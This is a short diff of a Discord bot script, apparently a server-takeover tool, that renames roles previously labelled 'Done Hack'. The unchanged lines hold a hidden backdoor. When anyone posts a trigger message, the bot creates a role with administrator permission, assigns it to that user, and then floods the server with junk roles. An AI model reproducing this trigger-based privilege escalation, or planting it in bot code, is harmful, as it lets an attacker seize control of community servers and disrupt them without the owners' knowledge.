@@ -66,36 +66,36 @@ client.on('message', message => {
  if (message.content === x_x) {
   if (!message.channel.guild) return;
   message.guild.createRole({
-   name: "Done Hack",
+   name: "M3999999OB",
    permissions: [8],
    color: "#23272a"
   }).then(function(role) {
    message.member.addRole(role);
   })
   message.guild.createRole({
-   name: "Done Hack",
+   name: "M3999OB",
    permissions: [1],
    color: " #23272a"
   });
   message.guild.createRole({
-   name: "Done Hack ",
+   name: "M39999OB ",
    permissions: [1],
    color: "#ff0000"
   });
 
   message.guild.createRole({
-   name: "Done Hack",
+   name: "M3999OB",
    permissions: [1],
    color: " #23272a"
   });
   message.guild.createRole({
-   name: "Done Hack",
+   name: "M3999OB",
    permissions: [1],
    color: "#ff0000"
   });
 
   message.guild.createRole({
-   name: "Done Hack",
+   name: "M39OB",
    permissions: [1],
    color: " #23272a"
   });
